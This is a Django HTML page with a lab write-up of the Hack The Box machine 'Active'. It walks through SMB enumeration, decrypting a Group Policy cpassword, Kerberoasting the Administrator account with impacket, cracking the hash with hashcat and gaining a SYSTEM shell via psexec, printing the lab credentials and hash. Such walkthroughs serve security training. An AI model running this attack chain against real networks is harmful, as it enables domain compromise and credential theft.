@@ -1,0 +1,228 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Actite</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 3.8</p>
+
+
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-06 03:48:08Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: <u>active.htb</u>, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+49173/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+<p class="text">We found the domain name <u>active.htb</u>.</p>
+<div class="code-box"><pre><code>└─$ echo '$IP active.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+<p class="text">There are few services we can target. Though http is open on 47001, there is no actually http server. Also, we notice 5985 & 5986 are not open, which we can access with evil-winrm.</p>
+<p class="text">Because SMB is open, I first enumerate shares.</p>
+
+<div class="code-box"><pre><code>└─$ smbclient -L $IP       
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.29.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</code></pre></div>
+
+<p class="text">I could login without providing password. Next we have to check which shares we can read without credential.</p>
+
+<div class="code-box"><pre><code>└─$ smbmap -H $IP   
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                                                   [|] Checking for open ports...                                                                                                   [/] Checking for open ports...                                                                                                   [*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 10.129.29.100:445       Name: active.htb                Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             <u>READ ONLY</u>
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+[*] Closed 1 connections  </code></pre></div>
+
+<p class="text">We can read Replication directory. Let's install whole dir to our local machine.</p>
+
+<div class="code-box"><pre><code>└─$ smbclient //$IP/Replication                                  
+Password for [WORKGROUP\kali]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *</code></pre></div>
+
+<p class="text">Then the directory installed to our machine. Let's enumerate files. and check if there is interesting information.</p>
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">Directory enumeration revealed that this is a replication of SYSVOL because of the directory structure.</p>
+<p class="text">Also, under the dir /active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups, I found xml file.</p>
+<div class="code-box"><pre><code>└─$ cat Groups.xml                                                      
+&lt;?xml version="1.0" encoding="utf-8"?>
+&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="<u>active.htb\SVC_TGS</u>" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">&lt;Properties action="U" newName="" fullName="" description="" cpassword="<u>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</u>" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>&lt;/User>
+&lt;/Groups></code></pre></div>
+
+<p class="text">There is cyphered password and username SVC_TGS.</p>
+<p class="text">When the GPP(Group Policy Preference) is created, the xml file storing configuration information is created. During creation of the file, the password is encrypted with AES key for security reason, however, at some point, Microsoft published the AES key and initialization vector. </p>
+<p class="text">Though Microsoft patched to not put password into GPP, there is no countermeasure for already created xml file.</p>
+<p class="text">Therefore, we can decode it really easyly.</p>
+
+<div class="code-box"><pre><code>└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+<u>GPPstillStandingStrong2k18</u></code></pre></div>
+
+<p class="text">We got plaintext password for SVC_TGS.</p>
+<p class="text">Let's check if it still valid for the user.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb $IP -u SVC_TGS -p 'GPPstillStandingStrong2k18'         
+SMB         10.129.29.100   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.129.29.100   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 </code></pre></div>
+
+<p class="text">Because it returned positive result, we can further enumerate shares.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb $IP -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares
+SMB         10.129.29.100   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.129.29.100   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+SMB         10.129.29.100   445    DC               [+] Enumerated shares
+SMB         10.129.29.100   445    DC               Share           Permissions     Remark
+SMB         10.129.29.100   445    DC               -----           -----------     ------
+SMB         10.129.29.100   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.29.100   445    DC               C$                              Default share
+SMB         10.129.29.100   445    DC               IPC$                            Remote IPC
+SMB         10.129.29.100   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.29.100   445    DC               Replication     READ            
+SMB         10.129.29.100   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.29.100   445    DC               Users           READ  </code></pre></div>
+<p class="text">We have three additional shares to read. Because Replication directory is copy of SYSVOL, we are interested in Users dir.</p>
+
+<div class="code-box"><pre><code>└─$ <u>smbclient //$IP/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'</u>
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sat Jul 21 10:39:20 2018
+  ..                                 DR        0  Sat Jul 21 10:39:20 2018
+  Administrator                       D        0  Mon Jul 16 06:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
+  Default                           DHR        0  Tue Jul 14 02:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
+  Public                             DR        0  Tue Jul 14 00:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
+                10459647 blocks of size 4096. 5203595 blocks available
+smb: \> cd SVC_TGS
+smb: \SVC_TGS\> cd Desktop
+smb: \SVC_TGS\Desktop\> dir
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                           AR       34  Wed Nov  5 22:45:51 2025
+smb: \SVC_TGS\Desktop\> get user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</code></pre></div>
+
+<p class="text">We got user.txt.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">In this context, we have no command interaction. However, we have valid creadential for user svc_tgs. Therefore, we might be able to perform Kerberoasting. </p>
+<div class="code-box"><pre><code>└─$ impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.129.29.100 -request  
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-11-05 22:45:55.751336             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d68e11935efae724bffa39aae2099b94$4b4cf2840f81316afd324b6e3f01dfb0a9fdae7935e94afa3c97582231b3fa7e79a4608d7e3eb6cd345d8f9e3fc7795c9e0d0d9bdcf9a7145fed711e2a2399cdc39b627408c69a099e08a7a476caab150d21d7348a972705b899e945f9e7d1540a42543d3dfac7297d7950fe934f86d9fa341d33b6f8e38d51e4491fdcb56de786213c926f247ccd1aae0ab73fcadc63f7a8bd4714432fb53e3d04306e8b92cb1be4f74c015d92dc98d45a5c376b3537be7eb925ba0377b86529bc260ff9534a4b852ab662c32f0c8588ea9805e03d628fe4f460cabd2b830fba41b01b0601c002a92be6265c99b638b4374d5db6c38d05aa6ba50ad1a5f1c5f49f6634946389381f4b6712f3b1b66f4fe9fffa14a1bc2185bc4d841846b362166940913b39128389af9ba7db0ec500fca13c1104ac8acbb7c3aafcd3ca962290f72ca80cc18db12dade486c579e6ebe00611adaa14a036ebf54d045d8242b32c76b898cd0cff240e3d54c9125a5ccf68413e0144e1dd4335303a509efcfc056878797ee29d9389f5031472a09ebdde882307cfbcca7929a7f6349a5acf15a2c1ca929d32d898a48ea855681d475a283df798b15ce070b77aa11fb8f418aa101a893a1a6210192a6a0e43fca790044d7fe775e44eafd81fbe76c2e734bef54e3a8501407f71d409115032e5e05aa4e952eb699d538501df93024a3209fe7574dff9b55c40fdc5676a8dd80c3c01db4c2d0dae1df5c1ec8e5e10ad5723f52e7f63cd31925d239d220cb24fdac4fa876bdd41e780bd944f4eb4b18866a0ea9116d64f7734874273b77e075cf74161917f5a3e274ad760e28ca680f0a7236656cfd8b7c81d188af356d4e5cf08c6e187fbcc3f70b1ec666838055d22f8ace6b895af3dc37c02337b956e9804c3d6c819824f02a1f7f3dd6eb80821d0fb0d8bd3f346e9b6ef8f6263103431f492a9042b7c5e83227b504867ab22fdcff60cf41c63a4a9f169580fd160466425b7927280a29a94394e5d75e112c0856abd4af49372f544f6317ab94b0ab70c6dca268db431ec253aab3bd253375bc28f76f0a3658761917cd2010d79567c82f5adb6a1340f970b7a7592d32ffdc8b4a0c13f725308ed38cc218ef7097203c0e929f3a5af7d6b73062599a218253e07a2d031b41e01ec19c45c61798d29ca780956b805b05177d764f0dc46f8585923d616d8695a09139c4393cb0df303a3191e7751c335506e45f0f2dee08c7959e3663f2b6d9470e2</code></pre></div>
+<p class="text">Above command find SPN user and automatically send request. We copy and paste this output and crack it.</p>
+
+<div class="code-box"><pre><code>└─$ hashcat -h | grep -i kerberos                       
+  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
+  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
+  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP</code></pre></div>
+
+<p class="text">Because it is TGS-REP(Ticket Granting Service Reply), we set 13100.</p>
+
+<div class="code-box"><pre><code>└─$ hashcat -m 13100 krb /usr/share/wordlists/rockyou.txt
+...
+<u>Ticketmaster1968</u></code></pre></div>
+<p class="text">We successfully cracked the password for Administrator.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-psexec active.htb/administrator@$IP                      
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.129.29.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file mbhZNKnx.exe
+[*] Opening SVCManager on 10.129.29.100.....
+[*] Creating service TTAI on 10.129.29.100.....
+[*] Starting service TTAI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </code></pre></div>
+<p class="text">We got admin command line. You can find root.txt under \Users\Administrator\Desktop.</p>
+
+
+
+
+</body>
+</html>
